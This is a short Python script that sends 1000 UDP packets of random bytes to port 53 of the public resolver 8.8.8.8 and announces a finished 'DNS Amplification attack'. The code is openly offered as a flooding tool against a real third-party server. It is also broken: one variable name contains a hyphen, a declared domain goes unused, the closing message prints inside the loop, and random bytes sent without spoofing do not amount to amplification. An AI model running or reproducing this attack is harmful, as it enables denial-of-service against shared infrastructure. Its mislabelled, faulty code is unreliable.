import socket
import random

target_dns_server = "8.8.8.8"
target_domain = ""
packet_size = 1024
packet-count = 1000

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

for _ in range(packet_count):
    packet = bytes (random.getrandbits(8) for _ in range(packet_size))
    sock.sendto(packet, (target_dns_server, 53))

    print("DNS Amplification attack finished!")
    